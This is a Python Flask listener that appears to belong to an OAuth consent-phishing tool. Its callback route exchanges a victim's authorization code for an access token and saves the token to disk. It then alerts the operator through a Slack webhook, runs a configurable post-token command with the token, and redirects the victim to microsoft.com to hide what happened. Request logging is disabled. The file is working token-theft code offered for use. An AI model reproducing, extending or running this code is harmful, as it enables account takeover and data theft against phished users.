#!/usr/bin/python3

import json
import sys
import os
 
import logging
import requests
from .functions import *
from flask import Flask, request, abort, redirect
 
parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)
 
from config import *
 
 
 
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
 
class WebListener():
    def __init__(self, *args) -> None:
        if len(args) == 2:
            self.host = args[0]
            self.port = args[1]
            app.run(self.host, self.port)
         
        elif len(args) == 4:
 
            self.host = args[0]
            self.port = args[1]
            self.key = args[2]
            self.cert = args[3]
            context = (self.cert, self.key)
            app.run(self.host, self.port, ssl_context=context)
 
 
@app.route('/')
def index():
    return ""
 
@app.route('/callback')
def callback():
    if 'code' not in request.args:
        abort(401)
    response = requests.post(TOKEN_URL, data={
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'code': request.args['code'],
    'grant_type': 'authorization_code',
    'scope': SCOPES,
    'redirect_uri': CALLBACK_URL})
    token = response.text
    if "access_token" in token:
        json_token = json.loads(token)
        access_token = json_token["access_token"]
        print_success("Token received successfully")
        print_info("Saving token to disk ..")
        save_token_to_file(token)
        send_notification_to_slack(SLACK_WEB_HOOK)
        take_action_after_token(POST_TOKEN_COMMAND, access_token)
     
    return redirect("http://www.microsoft.com", code=302)
